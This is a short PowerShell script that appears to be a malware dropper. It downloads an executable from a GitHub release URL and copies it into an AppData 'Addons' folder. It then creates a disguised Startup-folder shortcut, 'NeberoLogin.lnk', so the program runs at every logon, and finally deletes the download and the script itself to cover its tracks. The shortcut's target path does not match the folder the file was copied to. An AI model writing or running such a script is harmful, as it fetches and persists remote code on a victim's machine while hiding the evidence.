Invoke-WebRequest "https://github.com/DrunkenLyricist/nanny/releases/download/shit/hexagons.exe" -o s.exe
new-item C:\Users\$env:username\AppData\Roaming\Addons\ -itemtype directory
Copy-Item s.exe C:\Users\$env:username\AppData\Roaming\Addons\
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NeberoLogin.lnk")
$Shortcut.TargetPath = "C:\Users\$env:username\AppData\Roaming\s.exe"
$Shortcut.Save()
Remove-Item s.exe
Remove-Item .\shit.ps1